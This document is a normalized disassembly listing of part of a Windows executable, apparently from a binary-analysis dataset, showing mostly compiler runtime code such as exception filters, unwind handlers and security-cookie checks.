mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_41b1e0
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_414425
retn
push 0x8
call [ SetLastError@IAT ]
sub_41b384
push 0x1
call sub_417c49
pop ecx
retn
sub_41bdc3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41bb98
add esp 0x10
pop ebp
retn
sub_41bf47
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41bddd
add esp 0x10
pop ebp
retn
sub_41c04d
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_41bf84
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_41c098
call eax
retn
sub_41c277
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c160
add esp 0x10
pop ebp
retn
sub_41c3a2
push [ ebp + 0x8 ]
call sub_41778d
pop ecx
retn
sub_41cf87
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41cf45
add esp 0x10
pop ebp
retn
sub_41cfc0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41ce34
pop ecx
pop ecx
pop ebp
retn
sub_41cfd3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41cea7
pop ecx
pop ecx
pop ebp
retn
sub_41df32
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_41e05b
push 0x2
call sub_4140d7
pop ecx
retn
sub_41e1dc
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e0ee
add esp 0x10
pop ebp
retn
sub_41e4a6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_41c2a0
sub_41e767
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_42032c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420270
add esp 0xc
pop ebp
retn
sub_420370
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_4207d0
lea ecx [ ebp - 0x28 ]
jmp sub_408370
sub_4207d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_4207f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420810
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420830
mov eax [ ebp + 0x4 ]
jmp sub_408a70
sub_420838
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420860
mov ecx [ ebp - 0x10 ]
jmp sub_40e8ad
sub_420868
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420890
mov ecx [ ebp - 0x10 ]
jmp sub_40e8ad
sub_420898
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
j_sub_401040#5
jmp sub_401040
sub_4208c5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_4208e0
mov ecx [ ebp + 0x4 ]
jmp sub_408370
sub_4208e8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420910
lea ecx [ ebp - 0x48 ]
jmp sub_408370
sub_420918
lea ecx [ ebp - 0x64 ]
jmp sub_408370
sub_420920
lea ecx [ ebp - 0x2c ]
jmp sub_408370
sub_420928
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420950
lea ecx [ ebp - 0x128 ]
jmp sub_408370
sub_42095b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x128 ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_40e1e0
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420990
lea ecx [ ebp - 0x30 ]
jmp sub_408370
j_sub_401040#4
jmp sub_401040
sub_42099d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_40e1e0
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
j_sub_401040#6
jmp sub_401040
sub_4209d5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
j_sub_401040#3
jmp sub_401040
sub_4209f5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420a10
lea ecx [ ebp - 0x50 ]
jmp sub_408370
sub_420a18
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420a40
lea ecx [ ebp - 0x50 ]
jmp sub_408370
sub_420a48
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x44 ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420a70
lea ecx [ ebp - 0x54 ]
jmp sub_408370
sub_420a78
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
j_sub_401040#7
jmp sub_401040
sub_420aa5
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420ac0
mov eax [ ebp + 0x8 ]
jmp sub_408a70
sub_420ac8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
j_sub_408a60
jmp sub_408a60
sub_420af5
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420b10
mov eax [ ebp + 0x4 ]
jmp sub_408a70
sub_420b18
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420b40
lea eax [ ebp - 0x1224 ]
push eax
call sub_4080e0
retn
sub_420b4d
lea eax [ ebp - 0x1224 ]
jmp sub_408a70
sub_420b58
lea ecx [ ebp - 0x1150 ]
jmp sub_408370
sub_420b63
lea ecx [ ebp - 0x1134 ]
jmp sub_408370
sub_420b6e
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420b79
lea esi [ ebp - 0x11bc ]
jmp sub_408140
sub_420b84
lea esi [ ebp - 0x11fc ]
jmp sub_408140
sub_420b8f
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420b9a
lea esi [ ebp - 0x11bc ]
jmp sub_408140
sub_420ba5
lea esi [ ebp - 0x11fc ]
jmp sub_408140
sub_420bb0
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420bbb
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420bc6
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420bd1
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420bdc
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420be7
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420bf2
lea ecx [ ebp - 0x116c ]
jmp sub_408370
sub_420bfd
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1234 ]
mov ecx [ edx - 0x1238 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420c30
lea ecx [ ebp - 0x2634 ]
jmp sub_408370
sub_420c3b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2634 ]
mov ecx [ edx - 0x2638 ]
xor ecx eax
call sub_40e1e0
add eax 0x8
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420c70
lea ecx [ ebp - 0x150 ]
jmp sub_408370
sub_420c7b
lea ecx [ ebp - 0x150 ]
jmp sub_408370
sub_420c86
lea ecx [ ebp - 0x134 ]
jmp sub_408370
sub_420c91
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14c ]
mov ecx [ edx - 0x150 ]
xor ecx eax
call sub_40e1e0
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420cc0
lea eax [ ebp - 0x28 ]
jmp sub_40d740
sub_420cc8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_40e1e0
add eax 0x0
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420cf0
lea eax [ ebp - 0x2034 ]
jmp sub_40d740
sub_420cfb
lea ecx [ ebp - 0x202c ]
jmp sub_408370
sub_420d06
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x202c ]
mov ecx [ edx - 0x2030 ]
xor ecx eax
call sub_40e1e0
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420d40
lea ecx [ ebp - 0x182c ]
jmp sub_408370
sub_420d4b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1834 ]
mov ecx [ edx - 0x1838 ]
xor ecx eax
call sub_40e1e0
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420d80
lea ecx [ ebp - 0x202c ]
jmp sub_408370
sub_420d8b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2044 ]
mov ecx [ edx - 0x2048 ]
xor ecx eax
call sub_40e1e0
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420dc0
lea ecx [ ebp - 0x2430 ]
jmp sub_408370
sub_420dcb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2438 ]
mov ecx [ edx - 0x243c ]
xor ecx eax
call sub_40e1e0
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420e00
lea ecx [ ebp - 0x42c ]
jmp sub_408370
sub_420e0b
lea ecx [ ebp - 0x448 ]
jmp sub_408370
sub_420e16
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x440 ]
mov ecx [ edx - 0x444 ]
xor ecx eax
call sub_40e1e0
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420e50
lea ecx [ ebp - 0x2830 ]
jmp sub_408370
sub_420e5b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2840 ]
mov ecx [ edx - 0x2844 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420e90
lea ecx [ ebp - 0x4e2c ]
jmp sub_408370
sub_420e9b
lea ecx [ ebp - 0x4e48 ]
jmp sub_408370
sub_420ea6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4e70 ]
mov ecx [ edx - 0x4e74 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420ee0
lea ecx [ ebp - 0x1e2c ]
jmp sub_408370
sub_420eeb
lea ecx [ ebp - 0x1e48 ]
jmp sub_408370
sub_420ef6
lea ecx [ ebp - 0x1e64 ]
jmp sub_408370
sub_420f01
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1e80 ]
mov ecx [ edx - 0x1e84 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
j_sub_401040#2
jmp sub_401040
sub_420f35
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420f50
lea ecx [ ebp - 0x30 ]
jmp sub_408370
sub_420f58
lea ecx [ ebp - 0x4c ]
jmp sub_408370
sub_420f60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_40e1e0
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420f90
lea ecx [ ebp - 0xdb4 ]
jmp sub_408370
sub_420f9b
lea ecx [ ebp - 0xdb4 ]
jmp sub_408370
sub_420fa6
lea ecx [ ebp - 0xd34 ]
jmp sub_408370
sub_420fb1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xdbc ]
mov ecx [ edx - 0xdc0 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_420fe0
lea ecx [ ebp - 0x2864 ]
jmp sub_408370
sub_420feb
lea ecx [ ebp - 0x2864 ]
jmp sub_408370
sub_420ff6
lea ecx [ ebp - 0x2834 ]
jmp sub_408370
sub_421001
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x286c ]
mov ecx [ edx - 0x2870 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_421030
lea ecx [ ebp - 0x93ec ]
jmp sub_408370
sub_42103b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x93f4 ]
mov ecx [ edx - 0x93f8 ]
xor ecx eax
call sub_40e1e0
add eax 0x8
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_421070
lea ecx [ ebp - 0x2c ]
jmp sub_408370
sub_421078
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x30 ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_40e1e0
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_4210a0
lea esi [ ebp - 0x42ca0 ]
jmp sub_40ddf0
sub_4210ab
lea ecx [ ebp - 0x42c54 ]
jmp sub_408370
sub_4210b6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x42ca4 ]
mov ecx [ edx - 0x42ca8 ]
xor ecx eax
call sub_40e1e0
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_4210f0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_421110
lea eax [ ebp - 0x2c ]
jmp sub_408a70
sub_421118
lea esi [ ebp - 0x2c ]
jmp sub_408670
j_sub_401040
jmp sub_401040
sub_421125
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_421140
lea esi [ ebp - 0x38 ]
jmp sub_408670
sub_421148
lea esi [ ebp - 0x50 ]
jmp sub_408670
sub_421150
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_421170
lea eax [ ebp - 0x44 ]
jmp sub_408a70
sub_421178
lea esi [ ebp - 0x44 ]
jmp sub_408670
sub_421180
lea ecx [ ebp - 0x2c ]
jmp sub_408370
sub_421188
lea ecx [ ebp - 0x2c ]
jmp sub_408370
sub_421190
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x48 ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_40e1e0
mov eax r--data
jmp sub_4107e4
sub_4211b0
call sub_408450
push sub_421250
call sub_40eaf5
pop ecx
retn
sub_4211d0
push sub_4212b0
call sub_40eaf5
pop ecx
retn
sub_421230
push rw-data
call [ InitializeCriticalSection@IAT ]
push sub_421300
call sub_40eaf5
pop ecx
retn
sub_4212b0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_40f2fb
add esp 0x4
sub_4212e0
call sub_409000
mov eax [ rw-data ]
push eax
call sub_40f2fb
pop ecx
retn
sub_421300
push rw-data
call [ DeleteCriticalSection@IAT ]
retn
sub_42130c
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_40e8ad
